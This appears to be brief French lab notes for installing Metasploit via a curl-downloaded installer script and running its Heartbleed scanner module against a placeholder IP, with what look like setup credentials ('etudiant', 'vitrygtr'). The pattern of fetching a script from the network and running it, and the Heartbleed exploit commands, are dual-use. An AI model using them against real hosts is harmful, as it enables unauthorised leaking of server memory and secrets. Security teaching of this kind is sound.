# installer metasploit

curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
  chmod 755 msfinstall && \
  ./msfinstall



# lancer metasploit
/opt/metasploit-framework/bin/msfconsole

## répondre yes
## etudiant 
## vitrygtr

use auxiliary/scanner/ssl/openssl_heartbleed
set VERBOSE true
set RHOSTS <ip>
exploit



